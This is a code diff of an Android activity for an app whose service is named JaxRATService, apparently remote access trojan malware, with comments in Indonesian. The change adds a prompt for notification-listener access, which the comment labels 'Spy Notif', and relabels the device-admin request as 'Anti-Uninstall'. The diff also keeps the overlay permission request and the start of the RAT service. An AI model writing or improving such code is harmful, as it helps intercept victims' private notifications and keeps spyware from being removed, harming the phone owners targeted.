@@ -15,14 +15,14 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // Minta izin Notifikasi (Android 13+)
+        // 1. Minta izin Notifikasi biasa (Android 13+)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             if (checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                 requestPermissions(new String[]{android.Manifest.permission.POST_NOTIFICATIONS}, 101);
             }
         }
 
-        // Minta izin System Alert Window (Overlay)
+        // 2. Minta izin System Alert Window (Overlay)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (!Settings.canDrawOverlays(this)) {
                 Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
@@ -30,7 +30,7 @@ public class MainActivity extends Activity {
             }
         }
 
-        // Minta izin Device Admin (Pancingan awal)
+        // 3. Minta izin Device Admin (Anti-Uninstall)
         ComponentName adminComponent = new ComponentName(this, JaxAdminReceiver.class);
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
         if (!dpm.isAdminActive(adminComponent)) {
@@ -40,7 +40,15 @@ public class MainActivity extends Activity {
             startActivityForResult(intent, 103);
         }
 
-        // Jalankan Service
+        // 4. Minta izin Akses Notifikasi (Spy Notif) - INI YANG HILANG KEMARIN
+        try {
+            Intent notifIntent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+            startActivity(notifIntent);
+        } catch (Exception e) {
+            // Abaikan jika HP tidak support shortcut
+        }
+
+        // 5. Jalankan Service
         Intent serviceIntent = new Intent(this, JaxRATService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent);
